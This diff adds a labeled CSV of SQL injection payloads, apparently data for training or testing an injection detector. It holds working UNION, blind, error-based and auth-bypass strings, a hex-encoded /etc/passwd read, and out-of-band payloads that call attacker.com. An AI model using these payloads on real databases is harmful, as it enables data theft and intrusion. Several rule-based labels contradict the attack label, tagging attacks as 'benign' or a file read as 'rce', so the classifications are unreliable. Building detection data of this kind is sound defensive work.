@@ -1,0 +1,30 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+41430,1; SELECT * FROM users--,1,stacked_select,stacked_queries,generic,0.95,; SELECT  detected — stacked_queries injection (priority 3) on generic,rule-based
+41431,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",1,oob_dns,out_of_band,mysql,0.95,LOAD_FILE( detected — out_of_band injection (priority 2) on mysql,rule-based
+41432,'; EXEC master..xp_dirtree '//attacker.com/a'--,1,oob_mssql,rce,generic,0.95,EXEC master detected — rce injection (priority 1) on generic,rule-based
+41433,"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",1,oob_file_read,rce,mysql,0.95,0x2f6574632f706173737764 detected — rce injection (priority 1) on mysql,rule-based
+41434,admin'--,1,second_order,auth_bypass,generic,0.85,admin'-- with admin prefix — auth bypass pattern (priority 9),rule-based
+41435,1' AND '1'='1,1,second_order,boolean_blind,generic,0.85,AND '1'='1 detected — boolean_blind injection (priority 8) on generic,rule-based
+41436,'; SELECT ',1,second_order,stacked_queries,generic,0.85,; SELECT  detected — stacked_queries injection (priority 3) on generic,rule-based
+41437,' UNION SELECT NULL--,1,union_column_enum,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41438,"' UNION SELECT NULL,NULL--",1,union_column_enum,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41439,"' UNION SELECT NULL,NULL,NULL--",1,union_column_enum,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41440,"' UNION SELECT NULL,NULL,NULL,NULL--",1,union_column_enum,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41441,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",1,union_column_enum,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41442,"' UNION ALL SELECT NULL,NULL--",1,union_column_enum,union_based,generic,0.95,"UNION ALL SELECT, UNION ALL SELECT detected — union_based injection (priority 7) on generic",rule-based
+41443,"1 UNION SELECT @@version,NULL--",1,union_column_enum,union_based,mysql,0.95,UNION SELECT detected — union_based injection (priority 7) on mysql,rule-based
+41444,"1 UNION SELECT user(),database()--",1,union_column_enum,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41445,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",1,union_column_enum,union_based,mysql,0.95,UNION SELECT detected — union_based injection (priority 7) on mysql,rule-based
+41446,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",1,union_column_enum,union_based,mysql,0.95,UNION SELECT detected — union_based injection (priority 7) on mysql,rule-based
+41447,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,1,blind_boolean_advanced,auth_bypass,generic,0.95,admin' AND with admin prefix — auth bypass pattern (priority 9),rule-based
+41448,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",1,blind_boolean_advanced,auth_bypass,generic,0.95,admin') with admin prefix — auth bypass pattern (priority 9),rule-based
+41449,1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,1,blind_boolean_advanced,benign,generic,0.8,No attack signals detected in payload,rule-based
+41450,"' AND ORD(MID(password,1,1))>64 AND '1'='1",1,blind_boolean_advanced,boolean_blind,generic,0.95,AND '1'='1 detected — boolean_blind injection (priority 8) on generic,rule-based
+41451,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",1,blind_boolean_advanced,error_based,generic,0.95,"FLOOR(RAND, COUNT(*),CONCAT detected — error_based injection (priority 4) on generic",rule-based
+41452,' '1'='1,1,filter_bypass,unknown,unknown,0.5,Insufficient information to classify,rule-based
+41453,"1 UN ION SEL ECT NULL,NULL--",1,filter_bypass,benign,generic,0.8,No attack signals detected in payload,rule-based
+41454,"1 NULL,NULL--",1,filter_bypass,benign,generic,0.8,No attack signals detected in payload,rule-based
+41455,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_fingerprint,error_based,mysql,0.95,"FLOOR(RAND, COUNT(*),CONCAT detected — error_based injection (priority 4) on mysql",rule-based
+41456,"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",1,error_fingerprint,error_based,generic,0.95,EXTRACTVALUE( detected — error_based injection (priority 4) on generic,rule-based
+41457,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",1,error_fingerprint,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+41458,"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",1,error_fingerprint,error_based,generic,0.95,EXTRACTVALUE( detected — error_based injection (priority 4) on generic,rule-based
